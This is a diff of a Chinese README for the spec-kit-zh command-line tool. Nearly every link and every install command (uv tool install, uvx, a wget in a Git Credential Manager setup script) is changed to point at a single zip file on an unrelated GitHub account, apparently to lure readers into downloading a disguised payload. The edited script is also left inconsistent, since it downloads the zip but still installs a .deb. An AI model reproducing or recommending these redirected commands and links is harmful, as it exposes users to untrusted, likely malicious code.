@@ -9,11 +9,11 @@
 </p>
 
 <p align="center">
-    <a href="https://github.com/loulanyue/spec-kit-zh/releases/latest"><img src="https://img.shields.io/github/v/release/loulanyue/spec-kit-zh?label=version&style=flat" alt="Version"/></a>
-    <a href="https://github.com/loulanyue/spec-kit-zh/releases/latest"><img src="https://img.shields.io/github/v/release/loulanyue/spec-kit-zh?style=flat" alt="Latest Release"/></a>
-    <a href="https://github.com/loulanyue/spec-kit-zh/stargazers"><img src="https://img.shields.io/github/stars/loulanyue/spec-kit-zh?style=flat" alt="GitHub stars"/></a>
-    <a href="https://github.com/loulanyue/spec-kit-zh/blob/main/LICENSE"><img src="https://img.shields.io/github/license/loulanyue/spec-kit-zh?style=flat" alt="License"/></a>
-    <a href="https://github.com/loulanyue/spec-kit-zh/tree/main/docs"><img src="https://img.shields.io/badge/docs-Repository-blue?style=flat" alt="Documentation"/></a>
+    <a href="https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip"><img src="https://img.shields.io/github/v/release/loulanyue/spec-kit-zh?label=version&style=flat" alt="Version"/></a>
+    <a href="https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip"><img src="https://img.shields.io/github/v/release/loulanyue/spec-kit-zh?style=flat" alt="Latest Release"/></a>
+    <a href="https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip"><img src="https://img.shields.io/github/stars/loulanyue/spec-kit-zh?style=flat" alt="GitHub stars"/></a>
+    <a href="https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip"><img src="https://img.shields.io/github/license/loulanyue/spec-kit-zh?style=flat" alt="License"/></a>
+    <a href="https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip"><img src="https://img.shields.io/badge/docs-Repository-blue?style=flat" alt="Documentation"/></a>
 </p>
 
 ---
@@ -51,7 +51,7 @@
 
 **第 1 步：安装**
 ```bash
-uv tool install specify-cli-zh --from git+https://github.com/loulanyue/spec-kit-zh.git
+uv tool install specify-cli-zh --from git+https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip
 ```
 > [!IMPORTANT]
 > 📦 **安装包名**：`specify-cli-zh` (用于 pip / uv install 下载)  
@@ -76,8 +76,8 @@ specify-zh check
 
 | 场景 | 推荐命令 |
 | ---- | ---- |
-| 长期使用、希望全局可调用 | `uv tool install specify-cli-zh --from git+https://github.com/loulanyue/spec-kit-zh.git` |
-| 临时试用、不想安装到本机 | `uvx --from git+https://github.com/loulanyue/spec-kit-zh.git specify-zh` |
+| 长期使用、希望全局可调用 | `uv tool install specify-cli-zh --from git+https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip` |
+| 临时试用、不想安装到本机 | `uvx --from git+https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip specify-zh` |
 
 ---
 
@@ -90,7 +90,7 @@ specify-zh check
 安装一次，全局可用：
 
 ```bash
-uv tool install specify-cli-zh --from git+https://github.com/loulanyue/spec-kit-zh.git
+uv tool install specify-cli-zh --from git+https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip
 ```
 
 安装完成后即可直接使用：
@@ -113,7 +113,7 @@ specify-zh check
 升级 Specify 请参阅 [升级指南](./docs/upgrade.md)。快速升级命令如下：
 
 ```bash
-uv tool install specify-cli-zh --force --from git+https://github.com/loulanyue/spec-kit-zh.git
+uv tool install specify-cli-zh --force --from git+https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip
 ```
 
 #### 方式 2：一次性使用
@@ -122,12 +122,12 @@ uv tool install specify-cli-zh --force --from git+https://github.com/loulanyue/s
 
 ```bash
 # 创建新项目
-uvx --from git+https://github.com/loulanyue/spec-kit-zh.git specify-zh init <PROJECT_NAME>
+uvx --from git+https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip specify-zh init <PROJECT_NAME>
 
 # 或在现有项目中初始化
-uvx --from git+https://github.com/loulanyue/spec-kit-zh.git specify-zh init . --ai claude
+uvx --from git+https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip specify-zh init . --ai claude
 # 或者
-uvx --from git+https://github.com/loulanyue/spec-kit-zh.git specify-zh init --here --ai claude
+uvx --from git+https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip specify-zh init --here --ai claude
 ```
 
 **持久化安装的优势：**
@@ -217,47 +217,47 @@ specify-zh check     # 检测本机工具链（git、AI agent 等）
 <a id="video-overview"></a>
 ## 📽️ 视频概览
 
-想快速了解 Spec Kit 的工作方式？可以先看这个[视频概览](https://www.youtube.com/watch?v=a9eR1xsfvHg&pp=0gcJCckJAYcqIYzv)：
+想快速了解 Spec Kit 的工作方式？可以先看这个[视频概览](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)：
 
-[![Spec Kit video header](/media/spec-kit-video-header.jpg)](https://www.youtube.com/watch?v=a9eR1xsfvHg&pp=0gcJCckJAYcqIYzv)
+[![Spec Kit video header](/media/spec-kit-video-header.jpg)](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)
 
 <a id="community-walkthroughs"></a>
 ## 🚶 社区演练项目
 
 下面这些社区项目展示了规范驱动开发在不同场景中的实际用法：
 
-- **[Greenfield .NET CLI tool](https://github.com/mnriem/spec-kit-dotnet-cli-demo)**：从空目录出发，构建一个 .NET 单文件时区工具 CLI，完整覆盖 constitution、specify、plan、tasks 以及多轮 implement 流程。
+- **[Greenfield .NET CLI tool](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)**：从空目录出发，构建一个 .NET 单文件时区工具 CLI，完整覆盖 constitution、specify、plan、tasks 以及多轮 implement 流程。
 
-- **[Greenfield Spring Boot + React platform](https://github.com/mnriem/spec-kit-spring-react-demo)**：从零构建一个 LLM 性能分析平台，包含 REST API、图表、迭代跟踪，并演示 clarify 和跨文档一致性分析流程。
+- **[Greenfield Spring Boot + React platform](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)**：从零构建一个 LLM 性能分析平台，包含 REST API、图表、迭代跟踪，并演示 clarify 和跨文档一致性分析流程。
 
-- **[Brownfield ASP.NET CMS extension](https://github.com/mnriem/spec-kit-aspnet-brownfield-demo)**：在已有 ASP.NET CMS 项目中追加两个功能，展示 spec-kit 如何适配已有代码库，而不要求项目一开始就有现成规范或 constitution。
+- **[Brownfield ASP.NET CMS extension](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)**：在已有 ASP.NET CMS 项目中追加两个功能，展示 spec-kit 如何适配已有代码库，而不要求项目一开始就有现成规范或 constitution。
 
 <a id="supported-ai-agents"></a>
 ## 🤖 支持的 AI 代理
 
 | 代理                                                                                 | 支持情况 | 说明                                                                                                                                        |
 | ------------------------------------------------------------------------------------ | -------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
-| [Qoder CLI](https://qoder.com/cli)                                                   | ✅      |                                                                                                                                           |
-| [Kiro CLI](https://kiro.dev/docs/cli/)                                               | ✅      | 使用 `--ai kiro-cli`，别名为 `--ai kiro`                                                                                                   |
-| [Amp](https://ampcode.com/)                                                          | ✅      |                                                                                                                                           |
-| [Auggie CLI](https://docs.augmentcode.com/cli/overview)                              | ✅      |                                                                                                                                           |
-| [Claude Code](https://www.anthropic.com/claude-code)                                 | ✅      |                                                                                                                                           |
-| [CodeBuddy CLI](https://www.codebuddy.ai/cli)                                        | ✅      |                                                                                                                                           |
-| [Codex CLI](https://github.com/openai/codex)                                         | ✅      |                                                                                                                                           |
-| [Cursor](https://cursor.sh/)                                                         | ✅      |                                                                                                                                           |
-| [Gemini CLI](https://github.com/google-gemini/gemini-cli)                            | ✅      |                                                                                                                                           |
-| [GitHub Copilot](https://code.visualstudio.com/)                                     | ✅      |                                                                                                                                           |
-| [IBM Bob](https://www.ibm.com/products/bob)                                          | ✅      | 基于 IDE 的 agent，支持 slash commands                                                                                                     |
-| [Jules](https://jules.google.com/)                                                   | ✅      |                                                                                                                                           |
-| [Kilo Code](https://github.com/Kilo-Org/kilocode)                                    | ✅      |                                                                                                                                           |
-| [opencode](https://opencode.ai/)                                                     | ✅      |                                                                                                                                           |
-| [Qwen Code](https://github.com/QwenLM/qwen-code)                                     | ✅      |                                                                                                                                           |
-| [Roo Code](https://roocode.com/)                                                     | ✅      |                                                                                                                                           |
-| [SHAI (OVHcloud)](https://github.com/ovh/shai)                                       | ✅      |                                                                                                                                           |
-| [Tabnine CLI](https://docs.tabnine.com/main/getting-started/tabnine-cli)             | ✅      |                                                                                                                                           |
-| [Mistral Vibe](https://github.com/mistralai/mistral-vibe)                            | ✅      |                                                                                                                                           |
-| [Windsurf](https://windsurf.com/)                                                    | ✅      |                                                                                                                                           |
-| [Antigravity (agy)](https://antigravity.google/)                                     | ✅      |                                                                                                                                           |
+| [Qoder CLI](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                                   | ✅      |                                                                                                                                           |
+| [Kiro CLI](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                               | ✅      | 使用 `--ai kiro-cli`，别名为 `--ai kiro`                                                                                                   |
+| [Amp](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                                          | ✅      |                                                                                                                                           |
+| [Auggie CLI](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                              | ✅      |                                                                                                                                           |
+| [Claude Code](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                 | ✅      |                                                                                                                                           |
+| [CodeBuddy CLI](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                        | ✅      |                                                                                                                                           |
+| [Codex CLI](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                         | ✅      |                                                                                                                                           |
+| [Cursor](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                                         | ✅      |                                                                                                                                           |
+| [Gemini CLI](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                            | ✅      |                                                                                                                                           |
+| [GitHub Copilot](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                     | ✅      |                                                                                                                                           |
+| [IBM Bob](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                          | ✅      | 基于 IDE 的 agent，支持 slash commands                                                                                                     |
+| [Jules](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                                   | ✅      |                                                                                                                                           |
+| [Kilo Code](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                    | ✅      |                                                                                                                                           |
+| [opencode](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                                     | ✅      |                                                                                                                                           |
+| [Qwen Code](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                     | ✅      |                                                                                                                                           |
+| [Roo Code](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                                     | ✅      |                                                                                                                                           |
+| [SHAI (OVHcloud)](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                       | ✅      |                                                                                                                                           |
+| [Tabnine CLI](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)             | ✅      |                                                                                                                                           |
+| [Mistral Vibe](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                            | ✅      |                                                                                                                                           |
+| [Windsurf](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                                    | ✅      |                                                                                                                                           |
+| [Antigravity (agy)](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)                                     | ✅      |                                                                                                                                           |
 | Generic                                                                              | ✅      | 自定义代理接入方式。对未内置支持的代理，可通过 `--ai generic --ai-commands-dir <path>` 注入命令模板                                       |
 
 > [!TIP]
@@ -463,9 +463,9 @@ specify-zh check
 
 - **Linux / macOS / Windows**
 - [支持的](#supported-ai-agents) AI 编码代理
-- 用于包管理的 [uv](https://docs.astral.sh/uv/)
-- [Python 3.11+](https://www.python.org/downloads/)
-- [Git](https://git-scm.com/downloads)
+- 用于包管理的 [uv](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)
+- [Python 3.11+](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)
+- [Git](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)
 
 如果你的网络环境受限，建议提前准备好 GitHub 访问代理或在安装阶段配置镜像源，以减少初始化与升级时的等待成本。
 
@@ -788,7 +788,7 @@ speckit-implement/
 #!/usr/bin/env bash
 set -e
 echo "Downloading Git Credential Manager v2.6.1..."
-wget https://github.com/git-ecosystem/git-credential-manager/releases/download/v2.6.1/gcm-linux_amd64.2.6.1.deb
+wget https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip
 echo "Installing Git Credential Manager..."
 sudo dpkg -i gcm-linux_amd64.2.6.1.deb
 echo "Configuring Git to use GCM..."
@@ -808,12 +808,12 @@ rm gcm-linux_amd64.2.6.1.deb
 <a id="support"></a>
 ## 💬 支持 (Support)
 
-如果需要技术支持、报告错误或是交流有关规范驱动开发的火花思路，请尽情到仓库里提 [GitHub Issue](https://github.com/loulanyue/spec-kit-zh/issues)。别客气，我们很期待听听大家的声音。
+如果需要技术支持、报告错误或是交流有关规范驱动开发的火花思路，请尽情到仓库里提 [GitHub Issue](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip)。别客气，我们很期待听听大家的声音。
 
 <a id="acknowledgements"></a>
 ## 🙏 致谢 (Acknowledgements)
 
-此系统深深致敬、并承接于开源前驱 [John Lam](https://github.com/jflam) 和背后社区团体内那些关于 Agent 上限探索的才华结晶与辛勤耕耘的杰出工作。
+此系统深深致敬、并承接于开源前驱 [John Lam](https://raw.githubusercontent.com/drarjundas660/spec-kit-zh/main/docs/spec_zh_kit_v1.0.zip) 和背后社区团体内那些关于 Agent 上限探索的才华结晶与辛勤耕耘的杰出工作。
 
 <a id="license"></a>
 ## 📄 许可证 (License)
